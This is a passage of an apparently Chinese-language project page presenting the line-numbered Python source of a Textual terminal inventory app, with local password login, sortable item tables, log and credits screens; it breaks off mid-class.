命令托盘。保存数据、修改密码、切换亮/暗显示模式、退出程序、联系作者等命令可以在命令托盘（Command Palette）中查找并执行。 显示时间。 程序运行截图 程序代码 1from textual.screen import ModalScreen, Screen 2from textual.widgets import Label, Button, Input, Select, Header, Footer, DataTable, RichLog 3from textual.containers import Container, Horizontal, Center 4import csv 5import binascii 6import hashlib 7from os import urandom, chmod 8from itertools import cycle 9from rich.text import Text 10from rich.syntax import Syntax 11from textual.widget import Widget 12from textual.reactive import reactive 13from textual.message import Message 14from textual import on, work 15from time import asctime 16from textual.command import Provider, Hit 17from textual.app import App 18from textual.binding import Binding 19from os.path import getsize, exists 20from functools import partial 21 22 23class LoginStatus: 24 25 LOGIN_SUCCESS = 1 26 REQUEST_LOGIN = 2 27 FIRST_TIME_LOGIN = 5 28 REQUEST_CHANGE_PASSWORD = 6 29 EXIT_PROGRAM = 0 30 31 class REQUEST_LOGIN_ALT_TEXT: 32 33 input_box = \u0026#34;Password\u0026#34; 34 password = True 35 label = \u0026#34;Welcome to ItemManagementApp. Please login.\u0026#34; 36 button = \u0026#34;Login\u0026#34; 37 button_id = \u0026#34;login\u0026#34; 38 39 class FIRST_TIME_LOGIN_ALT_TEXT: 40 41 input_box = \u0026#34;Password\u0026#34; 42 password = False 43 label = \u0026#34;No available user detected. Please sign up.\u0026#34; 44 button = \u0026#34;Sign Up\u0026#34; 45 button_id = \u0026#34;first_time_login\u0026#34; 46 47 class REQUEST_CHANGE_PASSWORD_ALT_TEXT: 48 49 input_box = \u0026#34;New Password\u0026#34; 50 password = False 51 label = \u0026#34;You are changing your password.\u0026#34; 52 button = \u0026#34;Submit\u0026#34; 53 button_id = \u0026#34;change_password\u0026#34; 54 55 login_status_alt_text = { 56 REQUEST_LOGIN: REQUEST_LOGIN_ALT_TEXT, 57 FIRST_TIME_LOGIN: FIRST_TIME_LOGIN_ALT_TEXT, 58 REQUEST_CHANGE_PASSWORD: REQUEST_CHANGE_PASSWORD_ALT_TEXT 59 } 60 61 62class AlertModalScreen(ModalScreen): 63 64 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 65 AlertModalScreen { 66 align: center middle; 67 } 68 69 AlertModalScreen \u0026gt; #label { 70 align: center bottom; 71 } 72 73 AlertModalScreen \u0026gt; #button { 74 align: center top; 75 } 76 \u0026#34;\u0026#34;\u0026#34; 77 78 def __init__(self, alert_message): 79 super().__init__() 80 self.alert_message = alert_message 81 82 def compose(self): 83 with Container(id=\u0026#34;label\u0026#34;): 84 yield Label(self.alert_message) 85 yield Label(\u0026#34; \u0026#34;) 86 with Container(id=\u0026#34;button\u0026#34;): 87 yield Button(\u0026#34;OK\u0026#34;) 88 89 def on_button_pressed(self): 90 self.dismiss() 91 92 93class ItemModalScreen(ModalScreen): 94 95 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 96 ItemModalScreen { 97 align: center middle; 98 } 99 100 ItemModalScreen \u0026gt; Container { 101 border: thick $background; 102 background: $boost; 103 width: 50%; 104 height: 76%; 105 } 106 107 ItemModalScreen \u0026gt; Container \u0026gt; Label { 108 width: auto; 109 padding-left: 1; 110 padding-right: 1; 111 } 112 113 ItemModalScreen \u0026gt; Container \u0026gt; * { 114 margin: 1; 115 } 116 117 ItemModalScreen \u0026gt; Container \u0026gt; Horizontal { 118 width: 100%; 119 height: auto; 120 dock: bottom; 121 padding-left: 1; 122 padding-right: 1; 123 margin: 0; 124 } 125 126 ItemModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #submit { 127 align: left middle; 128 width: 1fr; 129 } 130 131 ItemModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #cancel { 132 align: right middle; 133 width: 1fr; 134 } 135 \u0026#34;\u0026#34;\u0026#34; 136 137 def compose(self): 138 self.name_input = Input(placeholder=\u0026#34;Name\u0026#34;, restrict=r\u0026#34;^[a-zA-Z0-9\\s]+$\u0026#34;) 139 self.unit_price_input = Input(placeholder=\u0026#34;Unit Price\u0026#34;, type=\u0026#34;number\u0026#34;) 140 self.quantity_input = Input(placeholder=\u0026#34;Quantity\u0026#34;, type=\u0026#34;integer\u0026#34;) 141 self.section_select = Select([ 142 (\u0026#34;Food\u0026#34;, \u0026#34;Food\u0026#34;), 143 (\u0026#34;Clothing\u0026#34;, \u0026#34;Clothing\u0026#34;), 144 (\u0026#34;Shoes \u0026amp; Hats\u0026#34;, \u0026#34;Shoes \u0026amp; Hats\u0026#34;), 145 (\u0026#34;Daily Necessities\u0026#34;, \u0026#34;Daily Necessities\u0026#34;), 146 (\u0026#34;Furniture\u0026#34;, \u0026#34;Furniture\u0026#34;), 147 (\u0026#34;Household Appliances\u0026#34;, \u0026#34;Household Appliances\u0026#34;), 148 (\u0026#34;Textiles\u0026#34;, \u0026#34;Textiles\u0026#34;), 149 (\u0026#34;Hardware Materials\u0026#34;, \u0026#34;Hardware Materials\u0026#34;), 150 (\u0026#34;Electric Materials\u0026#34;, \u0026#34;Electric Materials\u0026#34;), 151 (\u0026#34;Kitchenware\u0026#34;, \u0026#34;Kitchenware\u0026#34;) 152 ]) 153 self.id_number_label = Input(placeholder=\u0026#34;ID\u0026#34;) 154 with Container(): 155 yield Label(\u0026#34;You are adding a new item to the list.\u0026#34;) 156 yield Label(\u0026#34;Name\u0026#34;) 157 yield self.name_input 158 yield Label(\u0026#34;Unit Price\u0026#34;) 159 yield self.unit_price_input 160 yield Label(\u0026#34;Quantity\u0026#34;) 161 yield self.quantity_input 162 yield Label(\u0026#34;Section\u0026#34;) 163 yield self.section_select 164 yield Label(\u0026#34;ID\u0026#34;) 165 yield self.id_number_label 166 with Horizontal(): 167 yield Button(\u0026#34;Submit\u0026#34;, id=\u0026#34;submit\u0026#34;, variant=\u0026#34;success\u0026#34;) 168 yield Label(\u0026#34; \u0026#34;) 169 yield Button(\u0026#34;Cancel\u0026#34;, id=\u0026#34;cancel\u0026#34;, variant=\u0026#34;error\u0026#34;) 170 171 @on(Button.Pressed, \u0026#34;#submit\u0026#34;) 172 def submit_request(self): 173 try: 174 data = ( 175 self.name_input.value, 176 str(round(float(self.unit_price_input.value), 2)), 177 self.quantity_input.value, 178 self.section_select.value, 179 self.id_number_label.value 180 ) 181 self.dismiss(data) 182 183 except Exception: 184 self.dismiss() 185 186 @on(Button.Pressed, \u0026#34;#cancel\u0026#34;) 187 def cancel_request(self): 188 self.dismiss() 189 190 191class LoginModalScreen(ModalScreen): 192 193 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 194 LoginModalScreen { 195 align: center middle; 196 } 197 198 LoginModalScreen \u0026gt; Container { 199 border: thick $background; 200 background: $boost; 201 width: 50%; 202 height: 50%; 203 } 204 205 LoginModalScreen \u0026gt; Container \u0026gt; Label { 206 width: 100%; 207 padding-left: 1; 208 padding-right: 1; 209 } 210 211 LoginModalScreen \u0026gt; Container \u0026gt; * { 212 margin: 1; 213 } 214 215 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal { 216 width: 100%; 217 height: auto; 218 dock: bottom; 219 padding-left: 1; 220 padding-right: 1; 221 margin: 0; 222 } 223 224 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #login { 225 align: left middle; 226 width: 1fr; 227 } 228 229 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #first_time_login { 230 align: left middle; 231 width: 1fr; 232 } 233 234 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #change_password { 235 align: left middle; 236 width: 1fr; 237 } 238 239 LoginModalScreen \u0026gt; Container \u0026gt; Horizontal \u0026gt; #cancel { 240 align: left middle; 241 width: 1fr; 242 } 243 \u0026#34;\u0026#34;\u0026#34; 244 245 def __init__(self, status): 246 super().__init__() 247 self.status = status 248 self.status_alt_text = LoginStatus.login_status_alt_text.get(status) 249 250 def compose(self): 251 self.username_input = Input(placeholder=\u0026#34;Username\u0026#34;, restrict=r\u0026#34;^[^\\s]*$\u0026#34;) 252 self.password_input = Input(placeholder=self.status_alt_text.input_box, password=self.status_alt_text.password, restrict=r\u0026#34;^[^\\s]*$\u0026#34;) 253 with Container(): 254 yield Label(self.status_alt_text.label) 255 yield Label(\u0026#34;Username\u0026#34;) 256 yield self.username_input 257 yield Label(self.status_alt_text.input_box) 258 yield self.password_input 259 with Horizontal(): 260 yield Button(self.status_alt_text.button, id=self.status_alt_text.button_id) 261 yield Label(\u0026#34; \u0026#34;) 262 yield Button(\u0026#34;Cancel\u0026#34;, id=\u0026#34;cancel\u0026#34;, variant=\u0026#34;error\u0026#34;) 263 264 @on(Button.Pressed, \u0026#34;#login\u0026#34;) 265 def login_request(self): 266 try: 267 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 268 reader = csv.reader(logininfo, delimiter=\u0026#39;:\u0026#39;) 269 hashdata = list(reader)[0] 270 if self.__login_hash(hashdata, self.username_input.value, self.password_input.value): 271 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 272 logfile.write(f\u0026#34;Login at {asctime()}\\n\u0026#34;) 273 self.dismiss(LoginStatus.LOGIN_SUCCESS) 274 else: 275 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 276 logfile.write(f\u0026#34;Attempt to login at {asctime()}\\n\u0026#34;) 277 278 except Exception: 279 pass 280 281 @on(Button.Pressed, \u0026#34;#first_time_login\u0026#34;) 282 def first_time_login_requsest(self): 283 try: 284 hashdata = self.__first_time_login_hash(self.username_input.value, self.password_input.value) 285 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;w\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 286 writer = csv.writer(logininfo, delimiter=\u0026#39;:\u0026#39;) 287 writer.writerow(hashdata) 288 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 289 logfile.write(f\u0026#34;Sign up at {asctime()}\\n\u0026#34;) 290 self.dismiss(LoginStatus.LOGIN_SUCCESS) 291 292 except Exception: 293 pass 294 295 @on(Button.Pressed, \u0026#34;#change_password\u0026#34;) 296 def change_password_request(self): 297 try: 298 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 299 reader = csv.reader(logininfo, delimiter=\u0026#39;:\u0026#39;) 300 init_hashdata = list(reader)[0] 301 hashdata = self.__change_password_hash(init_hashdata, self.username_input.value, self.password_input.value) 302 if hashdata: 303 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;w\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 304 writer = csv.writer(logininfo, delimiter=\u0026#39;:\u0026#39;) 305 writer.writerow(hashdata) 306 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 307 logfile.write(f\u0026#34;Change password at {asctime()}\\n\u0026#34;) 308 self.dismiss(LoginStatus.LOGIN_SUCCESS) 309 310 except Exception: 311 pass 312 313 @on(Button.Pressed, \u0026#34;#cancel\u0026#34;) 314 def cancel_request(self): 315 if self.status != LoginStatus.REQUEST_CHANGE_PASSWORD: 316 self.dismiss(LoginStatus.EXIT_PROGRAM) 317 else: 318 self.dismiss() 319 320 def __login_hash(self, hashdata, *args): 321 calcdata = [] 322 pbkdf2data = [] 323 inputdata = list(args) 324 for iter in range(2): 325 salt = binascii.unhexlify(hashdata[iter * 2]) 326 pbkdf2data.append(hashdata[iter * 2 + 1]) 327 calcdata.append(binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, inputdata[iter].encode(), salt, 16)).decode()) 328 return calcdata == pbkdf2data 329 330 def __first_time_login_hash(self, *args): 331 hashdata = [] 332 for raw in args: 333 salt = urandom(16) 334 hashdata.append(binascii.hexlify(salt).decode()) 335 hashdata.append(binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, raw.encode(), salt, 16)).decode()) 336 return hashdata 337 338 def __change_password_hash(self, init_hashdata, *args): 339 salt = binascii.unhexlify(init_hashdata[0]) 340 if init_hashdata[1] == binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, self.username_input.value.encode(), salt, 16)).decode(): 341 hashdata = [] 342 for raw in args: 343 salt = urandom(16) 344 hashdata.append(binascii.hexlify(salt).decode()) 345 hashdata.append(binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, raw.encode(), salt, 16)).decode()) 346 return hashdata 347 else: 348 return False 349 350 351class DataTableScreen(Screen): 352 353 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 354 DataTableScreen { 355 align: center middle; 356 } 357 358 DataTableScreen \u0026gt; Container { 359 align: center top; 360 width: auto; 361 margin: 1; 362 } 363 364 DataTableScreen \u0026gt; Container \u0026gt; DataTable { 365 align: center top; 366 width: auto; 367 } 368 \u0026#34;\u0026#34;\u0026#34; 369 370 TITLE = \u0026#34;Item Management App\u0026#34; 371 SUB_TITLE = \u0026#34;Data Table View\u0026#34; 372 BINDINGS = [ 373 Binding(key=\u0026#39;n\u0026#39;, action=\u0026#34;sort_by_name\u0026#34;, description=\u0026#34;Sort By Name\u0026#34;, key_display=\u0026#39;N\u0026#39;, priority=True), 374 Binding(key=\u0026#39;N\u0026#39;, action=\u0026#34;sort_by_name\u0026#34;, show=False, priority=True), 375 Binding(key=\u0026#39;u\u0026#39;, action=\u0026#34;sort_by_unit_price\u0026#34;, description=\u0026#34;Sort By Unit Price\u0026#34;, key_display=\u0026#39;U\u0026#39;), 376 Binding(key=\u0026#39;U\u0026#39;, action=\u0026#34;sort_by_unit_price\u0026#34;, show=False), 377 Binding(key=\u0026#39;y\u0026#39;, action=\u0026#34;sort_by_quantity\u0026#34;, description=\u0026#34;Sort By Quantity\u0026#34;, key_display=\u0026#39;Y\u0026#39;), 378 Binding(key=\u0026#39;Y\u0026#39;, action=\u0026#34;sort_by_quantity\u0026#34;, show=False), 379 Binding(key=\u0026#39;e\u0026#39;, action=\u0026#34;sort_by_section\u0026#34;, description=\u0026#34;Sort By Section\u0026#34;, key_display=\u0026#39;E\u0026#39;, priority=True), 380 Binding(key=\u0026#39;E\u0026#39;, action=\u0026#34;sort_by_section\u0026#34;, show=False, priority=True), 381 Binding(key=\u0026#39;i\u0026#39;, action=\u0026#34;sort_by_id\u0026#34;, description=\u0026#34;Sort By ID\u0026#34;, key_display=\u0026#39;I\u0026#39;), 382 Binding(key=\u0026#39;I\u0026#39;, action=\u0026#34;sort_by_id\u0026#34;, show=False), 383 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 384 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False), 385 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 386 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 387 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 388 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 389 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 390 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 391 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 392 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 393 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 394 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 395 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 396 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 397 ] 398 399 cursors = cycle([\u0026#34;cell\u0026#34;, \u0026#34;row\u0026#34;, \u0026#34;column\u0026#34;]) 400 current_sorts = set() 401 402 def __init__(self, data): 403 super().__init__() 404 self.rows = data 405 406 def on_mount(self) -\u0026gt; None: 407 table = self.query_one(DataTable) 408 for col in self.rows[0]: 409 table.add_column(col, key=col) 410 table.add_rows(self.rows[1:]) 411 table.zebra_stripes = True 412 413 def compose(self): 414 yield Header(show_clock=True) 415 yield Footer() 416 with Container(): 417 yield DataTable() 418 419 def sort_reverse(self, sort_type): 420 reverse = sort_type in self.current_sorts 421 if reverse: 422 self.current_sorts.remove(sort_type) 423 else: 424 self.current_sorts.add(sort_type) 425 return reverse 426 427 def action_sort_by_name(self): 428 table = self.query_one(DataTable) 429 table.sort( 430 \u0026#34;Name\u0026#34;, 431 key=lambda name: name, 432 reverse=self.sort_reverse(\u0026#34;Name\u0026#34;) 433 ) 434 435 def action_sort_by_unit_price(self): 436 table = self.query_one(DataTable) 437 table.sort( 438 \u0026#34;Unit Price\u0026#34;, 439 key=lambda unit_price: float(unit_price), 440 reverse=self.sort_reverse(\u0026#34;Unit Price\u0026#34;) 441 ) 442 443 def action_sort_by_quantity(self): 444 table = self.query_one(DataTable) 445 table.sort( 446 \u0026#34;Quantity\u0026#34;, 447 key=lambda qty: int(qty), 448 reverse=self.sort_reverse(\u0026#34;Quantity\u0026#34;) 449 ) 450 451 def action_sort_by_section(self): 452 table = self.query_one(DataTable) 453 table.sort( 454 \u0026#34;Section\u0026#34;, 455 key=lambda section: section, 456 reverse=self.sort_reverse(\u0026#34;Section\u0026#34;) 457 ) 458 459 def action_sort_by_id(self): 460 table = self.query_one(DataTable) 461 table.sort( 462 \u0026#34;ID\u0026#34;, 463 key=lambda id_num: id_num, 464 reverse=self.sort_reverse(\u0026#34;ID\u0026#34;) 465 ) 466 467 def action_quit(self): 468 self.dismiss() 469 470 def key_space(self): 471 table = self.query_one(DataTable) 472 table.cursor_type = next(self.cursors) 473 474 475class LogScreen(Screen): 476 477 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 478 LogScreen { 479 align: center middle; 480 } 481 482 LogScreen \u0026gt; Container { 483 width: 90%; 484 height: 90%; 485 } 486 487 LogScreen \u0026gt; Container \u0026gt; Button { 488 dock: bottom; 489 } 490 \u0026#34;\u0026#34;\u0026#34; 491 492 TITLE = \u0026#34;Item Management App\u0026#34; 493 SUB_TITLE = \u0026#34;View Log File\u0026#34; 494 BINDINGS = [ 495 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 496 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 497 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 498 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 499 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 500 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 501 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 502 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 503 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 504 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 505 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 506 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 507 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 508 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False) 509 ] 510 511 def on_mount(self): 512 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as log_file: 513 log = log_file.read() 514 log_richlog = self.query_one(RichLog) 515 log_richlog.write(log) 516 517 def compose(self): 518 yield Footer() 519 yield Header(show_clock=True) 520 with Container(): 521 yield RichLog() 522 523 def action_quit(self): 524 self.dismiss() 525 526 527class CreditsScreen(Screen): 528 529 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 530 CreditsScreen { 531 align: center middle; 532 } 533 534 CreditsScreen \u0026gt; Center { 535 width: 90%; 536 height: 90%; 537 } 538 539 CreditsScreen \u0026gt; Center \u0026gt; Label { 540 align: center middle; 541 } 542 \u0026#34;\u0026#34;\u0026#34; 543 544 TITLE = \u0026#34;Item Management App\u0026#34; 545 SUB_TITLE = \u0026#34;Credits\u0026#34; 546 BINDINGS = [ 547 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 548 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 549 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 550 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 551 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 552 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 553 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 554 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 555 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 556 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 557 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 558 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 559 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 560 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False) 561 ] 562 563 banner = r\u0026#34;\u0026#34;\u0026#34; 564 ___ _ __ __ _ _ 565|_ _| |_ ___ _ __ ___ | \\/ | __ _ _ __ __ _ __ _ ___ _ __ ___ ___ _ __ | |_ / \\ _ __ _ __ 566 | || __/ _ \\ \u0026#39;_ ` _ \\ | |\\/| |/ _` | \u0026#39;_ \\ / _` |/ _` |/ _ \\ \u0026#39;_ ` _ \\ / _ \\ \u0026#39;_ \\| __| / _ \\ | \u0026#39;_ \\| \u0026#39;_ \\ 567 | || || __/ | | | | | | | | | (_| | | | | (_| | (_| | __/ | | | | | __/ | | | |_ / ___ \\| |_) | |_) | 568|___|\\__\\___|_| |_| |_| |_| |_|\\__,_|_| |_|\\__,_|\\__, |\\___|_| |_| |_|\\___|_| |_|\\__| /_/ \\_\\ .__/| .__/ 569 |___/ |_| |_| 570 571 572 573 574 _ _ _ _____ _ _ ___ ____ ____ 575 / \\ | | | |_ _| | | |/ _ \\| _ \\/ ___| _ 576 / _ \\| | | | | | | |_| | | | | |_) \\___ \\ (_) 577 / ___ \\ |_| | | | | _ | |_| | _ \u0026lt; ___) | _ 578/_/ \\_\\___/ |_| |_| |_|\\___/|_| \\_\\____/ (_) 579 580 581 _ _ ______ 582 | | (_) |__ / |__ ___ _ __ __ _ _ _ __ _ ___ 583 | | | | / /| \u0026#39;_ \\ / _ \\| \u0026#39;_ \\ / _` | | | |/ _` |/ _ \\ 584 | |___| | / /_| | | | (_) | | | | (_| | |_| | (_| | (_) | 585 |_____|_| /____|_| |_|\\___/|_| |_|\\__, |\\__, |\\__,_|\\___/ 586 |___/ |___/ 587 588 589 _ _ __ __ _ 590 | | (_) \\ \\ / /__ _ __ ___| |__ ___ 591 | | | | \\ \\ /\\ / / _ \\ \u0026#39;_ \\|_ / \u0026#39;_ \\ / _ \\ 592 | |___| | \\ V V / __/ | | |/ /| | | | __/ 593 |_____|_| \\_/\\_/ \\___|_| |_/___|_| |_|\\___| 594 595 596 _ _ _ _ _ 597 | | (_) | | | | __ _ ___ __| | ___ _ __ __ _ 598 | | | | | |_| |/ _` |/ _ \\ / _` |/ _ \\| \u0026#39;_ \\ / _` | 599 | |___| | | _ | (_| | (_) | (_| | (_) | | | | (_| | 600 |_____|_| |_| |_|\\__,_|\\___/ \\__,_|\\___/|_| |_|\\__, | 601 |___/ 602 \u0026#34;\u0026#34;\u0026#34; 603 604 def compose(self): 605 yield Header(show_clock=True) 606 yield Footer() 607 with Center(): 608 yield Label(self.banner) 609 610 def action_quit(self): 611 self.dismiss() 612 613 614class SourceCodeScreen(Screen): 615 616 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 617 SourceCodeScreen { 618 align: center middle; 619 } 620 621 SourceCodeScreen \u0026gt; Container { 622 align: center middle; 623 height: auto; 624 width: 100%; 625 } 626 627 SourceCodeScreen \u0026gt; Container \u0026gt; RichLog { 628 width: auto; 629 } 630 \u0026#34;\u0026#34;\u0026#34; 631 632 BINDINGS = [ 633 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 634 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 635 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 636 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 637 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 638 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 639 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 640 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 641 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 642 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 643 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 644 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 645 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 646 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False) 647 ] 648 649 def __init__(self, file_size): 650 super().__init__() 651 self.file_size = file_size 652 653 def on_mount(self): 654 with open(\u0026#34;ItemManagementApp.py\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as code_file: 655 code = code_file.read() 656 code_richlog = self.query_one(RichLog) 657 code_richlog.write(Syntax(code, \u0026#34;python\u0026#34;, indent_guides=True, code_width=160, line_numbers=True), scroll_end=True) 658 659 def compose(self): 660 yield Header(show_clock=True) 661 yield Footer() 662 with Container(): 663 yield RichLog(highlight=True, markup=True) 664 yield Label(f\u0026#34;Total {self.file_size} KiB.\u0026#34;) 665 666 def action_quit(self): 667 self.dismiss() 668 669 670class GDNModalScreen(ModalScreen): 671 672 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 673 